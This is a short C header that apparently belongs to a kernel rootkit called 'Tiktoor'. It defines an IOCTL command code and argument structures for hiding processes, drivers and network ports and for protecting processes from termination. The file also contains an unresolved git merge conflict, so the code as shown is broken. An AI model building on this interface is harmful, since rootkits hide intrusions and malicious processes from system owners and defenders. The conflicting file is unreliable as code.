#define TIKTOOR_IOCTL_CMD 0xdeadbeaf

struct TiktoorCmdArg {
    unsigned char action;
    void *subargs;
};

struct ProcessHidingSubargs {
    unsigned int pid;
};

struct DriverHidingSubargs {
<<<<<<< HEAD
    const char* name;
=======
    const char* name;
>>>>>>> 57507f202da51015bbd238624e94aa6a9968057f
};

struct PortHidingSubargs {
    unsigned char transmission_type;
    unsigned short port;
};

struct ProcessProtectingSubargs {
    unsigned int pid;
};